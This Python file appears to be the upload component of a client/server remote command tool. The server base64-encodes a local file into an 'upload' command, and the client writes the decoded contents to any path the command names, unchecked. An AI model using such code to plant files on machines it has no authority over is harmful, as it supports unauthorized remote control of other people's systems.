import base64, os

def client_upload(cmd):
    parts = cmd.split(" ")
    contents = base64.b64decode(parts[1])
    file_name = parts[2]

    with open(file_name, "wb") as f:
        f.write(contents)

    return "%s uploaded..." % file_name


def server_upload(cmd, data):
    """Uploads a file to a client

    Usage: upload <localfile> [remote file name]
    """
    return data

def server_upload_transform(cmd):
    parts = cmd.split(" ")
    contents = base64.b64encode(open(parts[1], "rb").read())

    new_cmd = "upload %s" % contents
    if len(parts) == 3:
        new_cmd += " %s" % parts[2]
    else:
        new_cmd += " %s" % os.path.basename(parts[1])

    return new_cmd


